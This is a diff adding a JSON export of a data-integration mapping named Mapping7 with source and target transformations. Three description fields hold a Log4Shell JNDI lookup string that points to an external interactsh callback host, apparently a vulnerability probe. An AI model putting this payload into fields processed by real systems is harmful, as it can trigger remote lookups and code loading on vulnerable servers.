@@ -1,0 +1,87 @@
+{
+  "content" : {
+    "description" : "${jndi:ldap://c6q8hoqek13lf5pibdc0cg4et3yyyyyyn.interactsh.com/a}",
+    "allowMaxFieldLength" : "false",
+    "documentType" : "AT_SCALE_MAPPING",
+    "name" : "Mapping7",
+    "links" : [
+      {
+        "link" : "Source -> target1"
+      }
+    ],
+    "transformations" : [
+      {
+        "description" : "${jndi:ldap://c6q8hoqek13lf5pibdc0cg4et3yyyyyyn.interactsh.com/a}",
+        "createTime" : "2021-12-11T12:35:17.227Z",
+        "name" : "Source",
+        "groups" : [
+          {
+            "input" : "false",
+            "name" : "DefaultGroup",
+            "output" : "true"
+          }
+        ],
+        "generateFilenamePort" : "false",
+        "useLabels" : "false",
+        "useSequenceFields" : "false",
+        "dataAdapter" : {
+          "excludeDynamicFileNameField" : "false",
+          "objectType" : "SINGLE",
+          "useDynamicFileName" : "false",
+          "readOptions" : {
+            "commandType" : 0,
+            "descending" : "false",
+            "queryAll" : "false",
+            "rowLimit" : 0,
+            "selectDistinct" : "false"
+          }
+        }
+      },
+      {
+        "description" : "${jndi:ldap://c6q8hoqek13lf5pibdc0cg4et3yyyyyyn.interactsh.com/a}",
+        "createTime" : "2021-12-11T12:35:17.230Z",
+        "name" : "target1",
+        "groups" : [
+          {
+            "input" : "true",
+            "name" : "DefaultGroup",
+            "output" : "false",
+            "rules" : [
+              {
+                "bulkRename" : "false",
+                "include" : "true"
+              }
+            ]
+          }
+        ],
+        "createTarget" : "false",
+        "fieldMappingMode" : "MANUAL",
+        "inputSorted" : "false",
+        "schemaProviderType" : "SELECTED_OBJECT",
+        "updateColumns" : null,
+        "useLabels" : "false",
+        "useSequenceFields" : "false",
+        "dataAdapter" : {
+          "excludeDynamicFileNameField" : "false",
+          "objectType" : "SINGLE",
+          "useDynamicFileName" : "false",
+          "writeOptions" : {
+            "batchSize" : 0,
+            "bulkApi" : "false",
+            "handleDecimalRoundOff" : "false",
+            "handleSpecialChars" : "false",
+            "operations" : [
+              "Insert"
+            ],
+            "setFieldsToNull" : "false",
+            "truncate" : "false",
+            "useErrorFile" : "false",
+            "useExactSrcNames" : "false",
+            "useSuccessFile" : "false"
+          }
+        }
+      }
+    ]
+  },
+  "vcsExportTime" : "2025-06-13 02:12:33 PDT"
+}
